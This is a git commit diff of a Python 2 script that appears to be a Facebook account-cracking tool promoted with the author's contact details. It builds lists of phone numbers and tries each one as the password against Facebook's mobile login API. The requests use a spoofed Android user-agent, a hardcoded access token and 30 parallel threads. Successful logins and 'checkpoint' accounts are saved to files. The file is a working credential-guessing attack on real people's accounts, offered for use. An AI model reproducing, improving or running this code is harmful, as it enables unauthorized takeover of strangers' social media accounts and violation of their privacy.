7176c8a5ab3e8c55b43fa879b95b48148d3f860a
Aadilafg001 <97997076+Aadilafg001@users.noreply.github.com>
2022-01-20 07:55:31 +0430

    Add files via upload

--- Emran.py
+++ Emran.py
@@ -5,19 +5,19 @@ for n in range(100000):
     sys.stdout = open('.txt', 'a')
     print nmbr
     sys.stdout.flush()
-
+ 
 try:
     import requests
 except ImportError:
     os.system('pip2 install requests')
-
+ 
 try:
     import mechanize
 except ImportError:
     os.system('pip2 install mechanize')
     time.sleep(1)
     os.system('python2 af.py')
-
+ 
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
@@ -27,38 +27,45 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
-
+ 
 def exb():
     print '[!] Exit'
     os.sys.exit()
-
-
+ 
+ 
 def psb(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.03)
-
-
+ 
+ 
 def t():
     time.sleep(1)
-
-
+ 
+ 
 def cb():
     os.system('clear')
-
-
+ 
+ 
 logo = """
+  
 
 
-
-
-
- 
- 
-
-   
-
+\033[1;96m:▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:\033[1;95m♡
+      \033[1;96m▒▒▒▒▒▒▒▒█▒█▒█▒▒▒█▒▒▒█▒▒▒▒▒▒▒▒▒▒::\033[1;94m♡
+     \033[1;96m:▒▒▒▒▒▒███▒█▒█▒███▒███▒▒▒▒▒▒▒▒▒▒:::\033[1;93m♡
+    \033[1;96m::▒▒▒▒▒▒█▒▒▒█▒█▒█▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒::::\033[1;92m♡      
+   \033[1;96m:::▒▒▒▒▒▒███▒███▒███▒███▒▒▒▒▒▒▒▒▒▒:::::\033[1;91m♡         
+  \033[1;96m::▒▒▒▒▒▒\033[1;91mWhatsapp\033[1;96m▒▒▒▒▒▒▒▒▒▒▒▒▒::::\033[1;96m♡        
+  \033[1;96m:▒▒▒▒▒▒\033[1;93m+93747103773\033[1;96m▒▒▒▒▒▒▒▒▒▒▒:::::\033[1;92m♡
+     \033[1;92m███████▒▒Welcome To A.CREATIONS ▒▒████████
+\033[1;95m♡╭──────────•◈•──────────╮♡\033[1;96mA.Creations\033[1;95m♡╭───•◈•───╮♡
+\033[1;94mAuthor\033[1;91m: \033[1;91mAadil_001
+\033[1;94mA.AKM\033[1;91m: \033[1;91▒▓██████████████]99.9
+\033[1;94mFacebook\033[1;91m: \033[1;91mhttps://www.facebook.com/hamza.aadil.391
+\033[1;94mWTelgrame\033[1;91m: \033[1;91m@AADIL_001
+\033[1;95m♡╰──────────•◈•──────────╯♡\033[1;96mA.CREATIONS\033[1;95m♡╰───•◈•───╯♡"""
 --------------------------------------------------
  Author      : Emranøø Aadil
  GitHub      : https://github.com/Aadilafg001
@@ -71,7 +78,7 @@ successful = []
 cpb = []
 oks = []
 id = []
-
+ 
 def Cybery():
     os.system('clear')
     print logo
@@ -79,8 +86,8 @@ def Cybery():
     print '  [01] CRACK  ALL Country  WITH NUMBERS '
     print 42 * '~'
     Ali()
-
-
+ 
+ 
 def Ali():
     global cpb
     global oks
@@ -98,12 +105,12 @@ def Ali():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
-
+ 
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             Ali ()
-
+ 
     elif bch == '0':
         exb()
     else:
@@ -115,14 +122,14 @@ def Ali():
     psb(' PLEAS WHIT...')
     time.sleep(0.5)
     print 40 * '~'
-
+ 
     def main(arg):
         user = arg
         try:
             os.mkdir('save')
         except OSError:
             pass
-
+ 
         try:
             pass1 = user
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
@@ -157,7 +164,7 @@ def Ali():
                 cpb.append(c + user + pass2)
         except:
             pass
-
+ 
     p = ThreadPool(30)
     p.map(main, id)
     print 42 * '\x1b[1;91m='
@@ -165,7 +172,8 @@ def Ali():
     print '[\xe2\x9c\x93]\x1b[1;92m Total successfull/\x1b[1;96mcheckpoint : ' + str(len(oks)) + '/' + str(len(cpb))
     print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
     raw_input('\n[Press Enter To Go Back]')
-
-
+ 
+ 
 if __name__ == '__main__':
     Cybery()
+ 
